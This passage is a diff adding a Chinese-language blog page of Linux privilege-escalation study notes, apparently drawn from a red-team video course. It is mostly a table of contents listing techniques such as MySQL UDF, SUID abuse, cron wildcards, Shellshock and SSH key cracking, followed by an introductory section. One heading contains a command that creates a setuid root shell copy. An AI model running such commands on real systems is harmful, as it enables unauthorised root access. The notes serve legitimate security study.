@@ -1,0 +1,2543 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+    <title>
+      我的技术与生活——111 | Hexo
+    </title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="referrer" content="no-&#114;eferrer">
+    <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="/css/public.css" />
+    <link rel="stylesheet" href="/css/layout.css" />
+    <link rel="stylesheet" href="/css/iconfont.css" />
+    <link rel="stylesheet" href="/css/APlayer.min.css" />
+    <script src="/js/APlayer.min.js"></script>
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jquery.pjax.min.js"></script>
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <script>
+      document.title = '我的技术与生活——111';
+    </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+<style>
+  .load {
+    width: 100%;
+    height: 100vh;
+    background-color: rgb(37, 35, 40);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    z-index: 9999;
+  }
+  .load-circle {
+    width: 80px;
+    height: 80px;
+    border: 8px solid orange;
+    border-bottom-color: transparent;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    animation: rotate 1s linear infinite;
+    filter: drop-shadow(0 0 3px orange);
+  }
+  .load-circle-inner {
+    width: 40px;
+    height: 40px;
+    border: 8px solid orange;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: rotate-reverse .5s linear infinite;
+  }
+  .load-text {
+    margin-top: 20px;
+    font-size: 24px;
+    color: orange;
+    display: flex;
+  }
+  .load-text span {
+    margin: 0 5px;
+    text-shadow: 5px 5px 5px orange;
+    animation: move 1s linear infinite;
+  }
+  .load-text span:nth-child(1) {
+    animation-delay: -0.6s;
+  }
+  .load-text span:nth-child(2) {
+    animation-delay: -0.5s;
+  }
+  .load-text span:nth-child(3) {
+    animation-delay: -0.4s;
+  }
+  .load-text span:nth-child(4) {
+    animation-delay: -0.3s;
+  }
+  .load-text span:nth-child(5) {
+    animation-delay: -0.2s;
+  }
+  .load-text span:nth-child(6) {
+    animation-delay: -0.1s;
+  }
+  @keyframes rotate {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(360deg); }
+  }
+  @keyframes rotate-reverse {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(-360deg); }
+  }
+  @keyframes move {
+    0% { transform: translateY(0%) rotate(0) scale(1); }
+    20% { transform: translateY(20%) rotate(10deg) scale(1.2); }
+    80% { transform: translateY(-10%) rotate(-20deg) scale(.8);}
+    100% { transform: translateY(0) rotate(0) scale(1); }
+  }
+
+  .progress {
+    position: fixed;
+    left: 0; top: 0;
+    width: 0;
+    height: 3px;
+    background-color: green;
+    transition: all cubic-bezier(0.215, 0.610, 0.355, 1) .1s;
+    z-index: 9999;
+  }
+
+  .to-up {
+    animation: toUp .5s 1;
+  }
+  .gray {
+    position: fixed;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100vh;
+    z-index: 9999;
+    display: none;
+    pointer-events: none;
+    background-color: #000;
+    mix-blend-mode: color;
+  }
+  @keyframes toUp {
+    from { transform: translateY(15px); opacity: 0; }
+    to { transform: translateY(0) ; opacity: 1; }
+  }
+</style>
+<body>
+  <div id="load" class="load">
+    <div class="load-circle">
+      <div class="load-circle-inner"></div>
+    </div>
+    <p class="load-text">
+      <span>L</span>
+      <span>O</span>
+      <span>A</span>
+      <span>D</span>
+      <span>I</span>
+      <span>N</span>
+      <span>G</span>
+    </p>
+  </div>
+  <div id="container" class="container w-100 vh-100" style="display: none;">
+    <header class="header">
+  <div class="header-wrapper">
+    <div class="header-left">
+      <div class="header-search">
+        <input id="search-input" type="text" class="header-search--input" placeholder="请输入要检索的文章标题" />
+        <span id="search-btn" class="header-search--icon"><i class="iconfont icon-sousuo"></i></span>
+      </div>
+      <div id="search-layer" class="header-search--layer hidden">
+        <p class="title">
+          <span>以下是搜索内容：</span>
+          <span id="close-layer-btn">关闭</span>
+        </p>
+        <ul>
+        </ul>
+      </div>
+    </div>
+    <div class="header-right">
+      <ul class="header-menu">
+        <li>
+          <a href="https://lmlsama.github.io/">
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+            <span class="header-menu--span">首页</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://lmlsama.github.io/log">
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+            <span class="header-menu--span">日志</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://lmlsama.github.io/link">
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+            <span class="header-menu--span">友情链接</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://lmlsama.github.io/about">
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+            <span class="header-menu--span">关于我</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</header>
+
+<script>
+  const ipt = document.querySelector('#search-input')
+  const btn = document.querySelector('#search-btn')
+  const layer = document.querySelector('#search-layer')
+  const posts = JSON.parse(`[{"title":"111","path":"2025/12/27/111/"},{"title":"靶机精讲：CONNECT THE DOTS","path":"2025/12/27/靶机精讲：CONNECT-THE-DOTS/"}]`)
+  ipt.addEventListener('keyup', e => {
+    if (e.key === 'Enter') {
+      handleSearch()
+    }
+  })
+  btn.addEventListener('click', () => {
+    handleSearch()
+  })
+
+  document.querySelector('#close-layer-btn').addEventListener('click', () => {
+    layer.classList.toggle('hidden')
+  })
+
+  function handleSearch() {
+    if (ipt.value.trim() === '') {
+      return
+    }
+    let html = ''
+    const targetPosts = posts.filter(post => post.title.includes(ipt.value))
+    targetPosts.forEach(post => {
+      html += `
+        <li>
+          <div>
+            <a href="/${post.path}">${post.title.replace(new RegExp(ipt.value), `<span>${ipt.value}</span>`)}</a>
+          </div>
+          <img src="${post.cover || '/imgs/default-cover.webp' }" />
+        </li>
+      `
+    })
+    if (html.trim () === '') {
+      html += '<p class="empty">没有搜索到内容</p>'
+    }
+    layer.querySelector('ul').innerHTML = html
+    layer.classList.remove('hidden')
+  }
+</script> 
+    <section id="main" class="main">
+      <div class="main-left-wrapper">
+<div class="main-left">
+  <div class="main-left--block">
+    <div class="main-left--info">
+      <img src="/imgs/avatar.jpg"" class="main-left--avatar" />
+      <div class="main-left--intro">
+        <p class="main-left--name">Cola.</p>
+        <div class="main-left--tags">
+          <span class="main-left--tag">中二</span>
+          <span class="main-left--tag">宅</span>
+        </div>
+      </div>
+    </div>
+  
+    <div>
+      <div class="main-left--motto">
+        <p>“花有重开日，人无再少年”</p>
+        <p>“一个简单普通的男孩”</p>
+      </div>
+      <div class="main-left--github">
+        <span class="line"></span>
+        <a target="_blank" rel="noopener" href="https://github.com/Aizener"><i class="logo iconfont icon-github-fill"></i></a>
+        <span class="line"></span>
+      </div>
+      <div class="main-left--statics">
+        <a href="/categories">
+          <div>
+            <span>0</span>
+            <span>分类</span>
+          </div>
+        </a>
+        <a href="/tags">
+          <div>
+            <span>0</span>
+            <span>标签</span>
+          </div>
+        </a>
+        <a href="/archives">
+          <div>
+            <span>1 </span>
+            <span>归档</span>
+          </div>
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <div class="main-left--block">
+    <ul class="main-left--menu">
+      
+        <li>
+          <a href="/">
+            <span class="header-menu--span">小站首页</span>
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/log">
+            <span class="header-menu--span">个人日志</span>
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/link">
+            <span class="header-menu--span">友情链接</span>
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/about">
+            <span class="header-menu--span">关于自己</span>
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/tools">
+            <span class="header-menu--span">我的工具</span>
+            <i class="header-menu--icon iconfont icon-gongju"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="main-left--block">
+    <div class="main-left--site">
+      <h5 class="main-left--title">
+        <span>站点信息</span>
+        <i class="iconfont icon-zhandian"></i>
+      </h5>
+      <p class="main-left--subtitle">
+        <span>文章数目：</span>
+        <span>2 篇</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>最近动态：</span>
+        <span>今天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>上线时间：</span>
+        <span>1411天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>当前版本：</span>
+        <span>v1.0.2</span>
+      </p>
+    </div>
+  </div>
+</div></div>
+      <div id="main-container" class="main-container">
+
+
+  <link rel="stylesheet" href="/css/partial/article.css" />
+
+<div class="article-container">
+  <div class="article">
+    <h1 class="article-title">111</h1>
+    <div class="article-info">
+      <div class="article-info--item">
+        <div class="article-info--info">
+          
+          <div class="article-info--categories">
+            <span>分类：</span>
+            
+          </div>
+          
+          
+          <div class="article-info--tags">
+            <span>标签：</span>
+            
+          </div>
+          
+          <p class="article-info--date">日期：2025-12-27 15:38:13</p>
+        </div>
+        <img src="/imgs/default-cover.webp" alt="" class="article-cover">
+      </div>
+    </div>
+    <article class="article-content markdown-body">
+      <p>** 内容过多，建议配合目录使用**</p>
+<p><strong>目录</strong></p>
+<p><a href="#Linux%E6%8F%90%E6%9D%83%E7%B2%BE%E8%AE%B2%EF%BC%9A%E5%8E%9F%E7%90%86%E5%92%8C%E6%9E%9A%E4%B8%BE">Linux提权精讲：原理和枚举</a></p>
+<p><a href="#%E7%AC%94%E8%AE%B0%E5%8F%82%E8%80%83%E3%80%90%E3%80%8C%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0%E3%80%8DLinux%E6%8F%90%E6%9D%83%E7%B2%BE%E8%AE%B2%EF%BC%9A%E5%8E%9F%E7%90%86%E5%92%8C%E6%9E%9A%E4%B8%BE%E3%80%91https://www.bilibili.com/video/BV1Wh4y1H7LK?vd_source=4d00741bef1efdd09444b6c478d355a0">笔记参考【「红队笔记」Linux提权精讲：原理和枚举】https://www.bilibili.com/video/BV1Wh4y1H7LK?vd_source&#x3D;4d00741bef1efdd09444b6c478d355a0</a></p>
+<p><a href="#%E4%B8%80%E3%80%81%E6%8F%90%E6%9D%83%E7%AE%80%E4%BB%8B">一、提权简介</a></p>
+<p><a href="#%E4%BA%8C%E3%80%81%E6%9D%83%E9%99%90%E4%BD%93%E7%B3%BB%EF%BC%88%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%EF%BC%89">二、权限体系（安全机制）</a></p>
+<p><a href="#1.%20%E5%B8%B8%E7%94%A8%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6">1. 常用安全机制</a></p>
+<p><a href="#2.%20%E4%B8%8D%E5%B8%B8%E7%94%A8%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6">2. 不常用安全机制</a></p>
+<p><a href="#%E4%B8%89%E3%80%81%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86">三、提权原理</a></p>
+<p><a href="#1.%20%E5%9F%BA%E4%BA%8E%E6%9D%83%E9%99%90%E4%BD%93%E7%B3%BB%EF%BC%88%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%EF%BC%89%E7%9A%84%E5%88%A9%E7%94%A8">1. 基于权限体系（安全机制）的利用</a></p>
+<p><a href="#2.%20%E5%9F%BA%E4%BA%8E%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E7%9A%84%E5%88%A9%E7%94%A8">2. 基于用户行为的利用</a></p>
+<p><a href="#3.%E5%86%85%E5%AD%98%E5%92%8C%20CPU%20%E5%B1%82%E9%9D%A2">3.内存和 CPU 层面</a></p>
+<p><a href="#%E5%9B%9B%E3%80%81%E6%8F%90%E6%9D%83%E6%9E%9A%E4%B8%BE">四、提权枚举</a></p>
+<p><a href="#1.%20%E5%8D%87%E7%BA%A7%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%8F%90%E7%A4%BA%E7%AC%A6%20/%20%E4%B9%9F%E5%8F%AB%E7%BB%88%E7%AB%AF%E5%8D%87%E7%BA%A7%EF%BC%88%E7%B2%BE%EF%BC%89">1. 升级命令行提示符 &#x2F; 也叫终端升级（精）</a></p>
+<p><a href="#2.%20%E6%89%8B%E5%B7%A5%E6%9E%9A%E4%B8%BE%EF%BC%88%E6%9C%80%E9%87%8D%E8%A6%81%EF%BC%8C%E6%9C%80%E5%89%8D%EF%BC%89">2. 手工枚举（最重要，最前）</a></p>
+<p><a href="#2.1%20%E6%9E%9A%E4%B8%BE%E7%94%A8%E6%88%B7%E5%92%8C%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF">2.1 枚举用户和系统信息</a></p>
+<p><a href="#2.2%20%E6%9E%9A%E4%B8%BE%E6%96%87%E4%BB%B6%E5%92%8C%E8%BF%9B%E7%A8%8B">2.2 枚举文件和进程</a></p>
+<p><a href="#2.3%20%E6%9E%9A%E4%B8%BE%E7%BD%91%E7%BB%9C%E5%92%8C%E6%8C%82%E8%BD%BD">2.3 枚举网络和挂载</a></p>
+<p><a href="#2.4%20%E6%9E%9A%E4%B8%BE%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90">2.4 枚举当前用户权限</a></p>
+<p><a href="#3.%20%E8%87%AA%E5%8A%A8%E5%8C%96%E6%9E%9A%E4%B8%BE%E5%B7%A5%E5%85%B7">3. 自动化枚举工具</a></p>
+<p><a href="#%E6%80%BB%E7%BB%93">总结</a></p>
+<p><a href="#%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE">思维导图</a></p>
+<p><a href="#Linux%E6%8F%90%E6%9D%83%E7%B2%BE%E8%AE%B2%EF%BC%9A%E6%BC%94%E7%A4%BA1%20-%20%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8F%90%E6%9D%83%EF%BC%8C%E4%BB%A5MySQL-UDF%E6%8F%90%E6%9D%83%E4%B8%BA%E4%BE%8B">Linux提权精讲：演示1 - 服务漏洞利用提权，以MySQL-UDF提权为例</a></p>
+<p><a href="#%E6%8F%90%E6%9D%83%E6%9D%A1%E4%BB%B6">提权条件</a></p>
+<p><a href="#1.%E6%8E%8C%E6%8F%A1MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E8%B4%A6%E5%8F%B7%EF%BC%8C%E6%9C%89creat%EF%BC%8Cinsert%EF%BC%8Cdelete...%E4%BB%A5%E5%88%9B%E5%BB%BA%E5%92%8C%E4%BD%BF%E7%94%A8%E5%87%BD%E6%95%B0%EF%BC%88%E6%9C%80%E5%A5%BD%E6%98%AFroot%E6%9D%83%E9%99%90%EF%BC%89">1.掌握MySQL数据库的账号，有creat，insert，delete…以创建和使用函数（最好是root权限）</a></p>
+<p><a href="#2.MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84secure_file_priv%20%E6%9D%83%E9%99%90%E5%9F%BA%E6%9C%AC%E4%B8%80%E8%88%AC%E5%BF%85%E9%A1%BB%E4%B8%BA%E7%A9%BA%20'%20'%EF%BC%88%E5%8D%B3%E9%BB%98%E8%AE%A4%E8%AE%BE%E7%BD%AE%E6%88%96%E5%8C%85%E5%90%AB%E6%89%80%E9%9C%80%E7%9B%AE%E5%BD%95plugin%EF%BC%89">2.MySQL数据库的secure_file_priv 权限基本一般必须为空 ‘ ‘（即默认设置或包含所需目录plugin）</a></p>
+<p><a href="#%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B">提权过程</a></p>
+<p><a href="#1518.c%20%E5%8F%88%E5%8F%AB%20raptor_udf2.c%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E6%8F%90%E6%9D%83%E6%BC%94%E7%A4%BA">1518.c 又叫 raptor_udf2.c利用文件提权演示</a></p>
+<p><a href="#1.%20-g">1. -g</a></p>
+<p><a href="#2.%20-c">2. -c</a></p>
+<p><a href="#3.%20raptor_udf2.c">3. raptor_udf2.c</a></p>
+<p><a href="#4.%20-fPIC">4. -fPIC</a></p>
+<p><a href="#%E6%80%BB%E7%BB%93%EF%BC%9A">总结：</a></p>
+<p><a href="#%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE">思维导图</a></p>
+<p><a href="#Linux%E6%8F%90%E6%9D%83%E7%B2%BE%E8%AE%B2%EF%BC%9A%E6%BC%94%E7%A4%BA2%20-%20%E9%87%8D%E7%A3%85%E5%A4%A7%E4%BD%9C%EF%BC%81Linux%E6%8F%90%E6%9D%83%E5%A4%A7%E8%B5%8F%EF%BC%8C20%E7%A7%8DLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8F%90%E6%9D%83%E6%BC%94%E7%A4%BA%E7%B2%BE%E8%AE%B2%E4%B8%80%E6%AC%A1%E7%9C%8B%E5%AE%8C%EF%BC%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%BF%85%E4%BF%AE%E8%AF%BE%E4%B8%80%E6%AC%A1%E5%BD%BB%E5%BA%95%E6%90%9E%E5%AE%9A%EF%BC%81">Linux提权精讲：演示2 - 重磅大作！Linux提权大赏，20种Linux渗透测试提权演示精讲一次看完，渗透测试必修课一次彻底搞定！</a></p>
+<p><a href="#shadow%E5%92%8Cpasswd%203%E8%AE%B2">shadow和passwd 3讲</a></p>
+<p><a href="#1,%E5%8F%AF%E8%AF%BBshadow%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%E6%8F%90%E6%9D%83">1,可读shadow文件利用提权</a></p>
+<p><a href="#2%EF%BC%8C%E5%8F%AF%E5%86%99shadow%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%E6%8F%90%E6%9D%83">2，可写shadow文件利用提权</a></p>
+<p><a href="#3%EF%BC%8C%E5%8F%AF%E5%86%99passwd%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%E6%8F%90%E6%9D%83">3，可写passwd文件利用提权</a></p>
+<p><a href="#sudo%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83">sudo环境变量提权</a></p>
+<p><a href="#%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B">提权过程</a></p>
+<p><a href="#%E6%8F%90%E6%9D%83%E9%80%BB%E8%BE%91">提权逻辑</a></p>
+<p><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%85%B1%E4%BA%AB%E5%BA%93">什么是共享库</a></p>
+<p><a href="#%E8%87%AA%E5%8A%A8%E4%BB%BB%E5%8A%A1%203%E8%AE%B2">自动任务 3讲</a></p>
+<p><a href="#1%EF%BC%8C%E8%87%AA%E5%8A%A8%E4%BB%BB%E5%8A%A1%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E6%8F%90%E6%9D%83">1，自动任务文件权限提权</a></p>
+<p><a href="#2%EF%BC%8C%E8%87%AA%E5%8A%A8%E4%BB%BB%E5%8A%A1PATH%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83">2，自动任务PATH环境变量提权</a></p>
+<p><a href="#3%EF%BC%8C%E8%87%AA%E5%8A%A8%E4%BB%BB%E5%8A%A1%E9%80%9A%E9%85%8D%E7%AC%A6%20'*'%20%E6%8F%90%E6%9D%83">3，自动任务通配符 ‘*‘ 提权</a></p>
+<p><a href="#tar%20%E7%9A%84%20Checkpoint%20%E6%9C%BA%E5%88%B6">tar 的 Checkpoint 机制</a></p>
+<p><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F">利用方式</a></p>
+<p><a href="#%E2%91%A0%20sudo%20%E7%99%BD%E5%90%8D%E5%8D%95">① sudo 白名单</a></p>
+<p><a href="#%E2%91%A1%20cron/root%20%E5%AE%9A%E6%97%B6%E5%A4%87%E4%BB%BD%E8%84%9A%E6%9C%AC">② cron&#x2F;root 定时备份脚本</a></p>
+<p><a href="#tar%E7%9A%84sudo%E7%99%BD%E5%90%8D%E5%8D%95%E6%8F%90%E6%9D%83%E4%B8%8A%E4%B8%8B">tar的sudo白名单提权上下</a></p>
+<p><a href="#SUID%E6%8F%90%E6%9D%83%205%E8%AE%B2">SUID提权 5讲</a></p>
+<p><a href="#1.SUID%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E5%B7%B2%E7%9F%A5%E5%88%A9%E7%94%A8%E6%8F%90%E6%9D%83">1.SUID可执行文件已知利用提权</a></p>
+<p><a href="#2.SUID%E5%85%B1%E4%BA%AB%E5%BA%93%E6%B3%A8%E5%85%A5%E6%8F%90%E6%9D%83">2.SUID共享库注入提权</a></p>
+<p><a href="#Shared%20Object%EF%BC%88%E5%85%B1%E4%BA%AB%E5%BA%93%EF%BC%89%20%E2%98%85%E2%98%85%E2%98%85%20%E6%9C%80%E5%B8%B8%E8%A7%81%2099%25">Shared Object（共享库） ★★★ 最常见 99%</a></p>
+<p><a href="#3.SUID%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%88%A9%E7%94%A8%E6%8F%90%E6%9D%83">3.SUID环境变量利用提权</a></p>
+<p><a href="#%E5%90%AF%E7%A4%BA">启示</a></p>
+<p><a href="#%E5%B7%A7%E7%94%A8SUID-shell%E5%8A%9F%E8%83%BD%E6%8F%90%E5%8F%96#1%20version%3C4.2">巧用SUID-shell功能提取#1 version&lt;4.2</a></p>
+<p><a href="#%E6%9C%80%E7%A8%B3%E9%80%89%E6%8B%A9%EF%BC%9ACVE-2014-6271%20%22Shellshock%22">最稳选择：CVE-2014-6271 “Shellshock”</a></p>
+<p><a href="#%E4%B8%80%E3%80%81%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0%EF%BC%88%E7%BA%AF%20shell%20%E5%9C%BA%E6%99%AF%EF%BC%89">一、本地复现（纯 shell 场景）</a></p>
+<p><a href="#%E5%B7%A7%E7%94%A8SUID-shell%E5%8A%9F%E8%83%BD%E6%8F%90%E5%8F%96#2">巧用SUID-shell功能提取#2</a></p>
+<p><a href="#%E2%91%A0%20env%20-i">① env -i</a></p>
+<p><a href="#%E2%91%A1%20SHELLOPTS='xtrace'">② SHELLOPTS&#x3D;’xtrace’</a></p>
+<p><a href="#%E2%91%A2%20PS4='$(cp%20/bin/bash%20/tmp/rootbash;%20chmod%20+xs%20/tmp/rootbash)'">③ PS4&#x3D;’$(cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;rootbash; chmod +xs &#x2F;tmp&#x2F;rootbash)’</a></p>
+<p><a href="#%E2%91%A3%20/usr/local/bin/suid-env2">④ &#x2F;usr&#x2F;local&#x2F;bin&#x2F;suid-env2</a></p>
+<p><a href="#%E5%AF%86%E7%A0%81%E5%92%8C%E5%AF%86%E9%92%A5%E6%8F%90%E6%9D%83%203%E8%AE%B2">密码和密钥提权 3讲</a></p>
+<p><a href="#1.%E5%AF%86%E7%A0%81%E5%92%8C%E5%AF%86%E9%92%A5%E5%8E%86%E5%8F%B2%E6%96%87%E4%BB%B6%E6%8F%90%E6%9D%83">1.密码和密钥历史文件提权</a></p>
+<p><a href="#%E5%85%B6%E4%BB%96%EF%BC%9A">其他：</a></p>
+<p><a href="#2.%E5%AF%86%E7%A0%81%E5%AF%86%E9%92%A5%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E6%8F%90%E6%9D%83">2.密码密钥配置文件查看提权</a></p>
+<p><a href="#3.SSH%E5%AF%86%E9%92%A5%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%8F%90%E6%9D%83">3.SSH密钥敏感信息提权</a></p>
+<p><a href="#NFS%E6%8F%90%E6%9D%83">NFS提权</a></p>
+<p><a href="#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8F%90%E6%9D%83">内核漏洞利用提权</a></p>
+<p><a href="#doas%20less%20+%20vi%E6%8F%90%E6%9D%83">doas less + vi提权</a></p>
+<p><a href="#%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9">相关知识点</a></p>
+<p><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%20sudo%20%E4%B8%8D%E6%8B%A6%E6%88%AA%EF%BC%9F">为什么 sudo 不拦截？</a></p>
+<p><a href="#%E5%93%AA%E4%BA%9B%E7%A8%8B%E5%BA%8F%E6%9C%89%20!%20%E9%80%83%E9%80%B8">哪些程序有 ! 逃逸</a></p>
+<p><a href="#%E6%80%BB%E7%BB%93">总结</a></p>
+<p><a href="#%E5%88%A9%E7%94%A8MOTD%E6%9C%BA%E5%88%B6%E6%8F%90%E6%9D%83">利用MOTD机制提权</a></p>
+<p><a href="#%E5%8F%AF%E9%A2%84%E6%B5%8BPRNG%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3SSH%E6%8F%90%E6%9D%83">可预测PRNG暴力破解SSH提权</a></p>
+<p><a href="#%E7%94%A8%E5%85%AC%E9%92%A5%E4%BF%A1%E6%81%AF%E7%A0%B4%E8%A7%A3%E5%87%BA%E7%A7%81%E9%92%A5%EF%BC%88%E7%B2%BE%EF%BC%89">用公钥信息破解出私钥（精）</a></p>
+<p><a href="#%E4%B8%8B%E8%BD%BD%E5%85%AC%E7%A7%81%E9%92%A5%E5%AF%B9%E5%BA%93">下载公私钥对库</a></p>
+<p><a href="#%E8%A7%A3%E5%8E%8B%E7%BC%A9">解压缩</a></p>
+<p><a href="#%E7%94%A8authorized_keys%E7%9A%84%E5%85%AC%E9%92%A5%E8%BF%9B%E8%A1%8C%E6%90%9C%E7%B4%A2">用authorized_keys的公钥进行搜索</a></p>
+<p><a href="#%E5%A4%84%E7%90%86ssh%E7%99%BB%E5%BD%95%E5%8F%82%E6%95%B0%E9%97%AE%E9%A2%98%EF%BC%88%E7%B2%BE%EF%BC%89">处理ssh登录参数问题（精）</a></p>
+<p><a href="#%E4%B8%BB%E9%94%AE%E7%B1%BB%E5%9E%8B%E7%9A%84%E9%97%AE%E9%A2%98">主键类型的问题</a></p>
+<p><a href="#pubkey%E7%9A%84%E9%97%AE%E9%A2%98">pubkey的问题</a></p>
+<p><a href="#%E5%85%B6%E4%BB%96%E5%8F%AF%E8%83%BD%E9%81%87%E8%A7%81%E7%9A%84%E9%97%AE%E9%A2%98">其他可能遇见的问题</a></p>
+<p><a href="#%E8%8E%B7%E5%BE%97%E5%88%9D%E5%A7%8B%E6%9D%83%E9%99%90shell">获得初始权限shell</a></p>
+<hr>
+<p>笔记均参考B站红队笔记大佬</p>
+<p><a target="_blank" rel="noopener" href="https://space.bilibili.com/491748397?spm_id_from=333.788.upinfo.head.click" title="红队笔记的个人空间-红队笔记个人主页-哔哩哔哩视频">红队笔记的个人空间-红队笔记个人主页-哔哩哔哩视频</a></p>
+<h1 id="Linux提权精讲：原理和枚举"><a href="#Linux提权精讲：原理和枚举" class="headerlink" title="Linux提权精讲：原理和枚举"></a>Linux提权精讲：原理和枚举</h1><ul>
+<li><p><strong>笔记参考【「红队笔记」Linux提权精讲：原理和枚举】<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Wh4y1H7LK?vd%5C_source=4d00741bef1efdd09444b6c478d355a0">https://www.bilibili.com/video/BV1Wh4y1H7LK?vd\_source=4d00741bef1efdd09444b6c478d355a0</a></strong></p>
+</li>
+<li><h2 id="一、提权简介"><a href="#一、提权简介" class="headerlink" title="一、提权简介"></a>一、提权简介</h2><p>提权就是提升权限，源自英语<code>Privilege Escalation/PrivEsca/PE</code>它是指在渗透测试或红队行动中获得较低权限用户之后提升至更高权限用户,直至获得ROOT权限用户的过程</p>
+<p>我们很难直接获得系统的最高权限（root），因为<strong>应用程序通常是按需配置权限的提权方法</strong></p>
+<p>没有一劳永逸的解决方案， 因此我们不能依赖某种或几种方法解决所有问题。然而我们可以研究常规手段和一般规律，解决大部分情况</p>
+<p>很大程度上取决于目标系统的配置，我们可以通过分析像内核版本；已安装的应用程序；支持的编程语言；其他用户的凭据等关键因素，找到获得ROOT的方法</p>
+<p>关键元素包括：操作系统或应用程序中的错误配置漏洞，超特权用户，弱凭据…</p>
+<p>提权的重要性体现:1,重置密码；2,想绕过访问控制来提取受保护的数据；3,编辑软件配置；4,开启持久化，以便稍后可以再次访问这台计算机；5,更改现有或新建用户的用户权限；6,执行任何管理命令</p>
+<h2 id="二、权限体系（安全机制）"><a href="#二、权限体系（安全机制）" class="headerlink" title="二、权限体系（安全机制）"></a>二、权限体系（安全机制）</h2><h3 id="1-常用安全机制"><a href="#1-常用安全机制" class="headerlink" title="1. 常用安全机制"></a>1. 常用安全机制</h3><p><img src="https://i-blog.csdnimg.cn/img_convert/5e340e1026bfc2a0c34123864068308c.png" alt="img"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<blockquote>
+<p>chmod - change file mode bits 改变文件的权限</p>
+<p>chgrp - change group ownership 改变文件所属的组</p>
+<p>chown - change file owner and group 改变文件所有者</p>
+</blockquote>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/f0cf071368716568339fe3f9dde3ce65.png" alt="image-20251125140935928"></p>
